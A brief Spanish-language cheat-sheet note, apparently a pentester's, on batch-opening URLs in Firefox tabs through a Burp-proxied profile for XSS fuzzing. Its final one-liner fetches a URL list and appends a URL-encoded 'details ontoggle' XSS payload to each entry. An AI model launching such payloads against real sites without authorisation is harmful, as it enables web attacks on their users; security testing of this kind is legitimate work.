#### Fuzzing con Firefox
+ Abre una nueva pestaña con el payload que le añadas a la petición.
+ Se puede añadir un perfil de firefox distinto para cada distinta prueba

`xargs -a $1 firefox --no-remote --new-tab -url "$line"`

```
#firefox $1 = file with subdomain list
firefox_multiple_tabs() {
    list="$(<$1) ending"
    firefox --no-remote --profile ~/.mozilla/firefox/ok0h3gj9.burp8080 $list 2>&1 &
}
```

+ Pasa el payload desde un host (o en local) y abre cada URL en una nueva pestana de Firefox

```wget "https://host_sirviendo_payload/payload.txt" -O /tmp/kakon && sleep 3 | sed -i "s/$/\/resource-1\?\%22\%253E\%253Cdetails\%2Fopen\%2Fontoggle\%253dconfirm\%2560puton\%2560\%253E/" /tmp/kakon && sleep 3 | xargs -a /tmp/kakon firefox --no-remote --new-tab -url "$line" 2>&1 &```
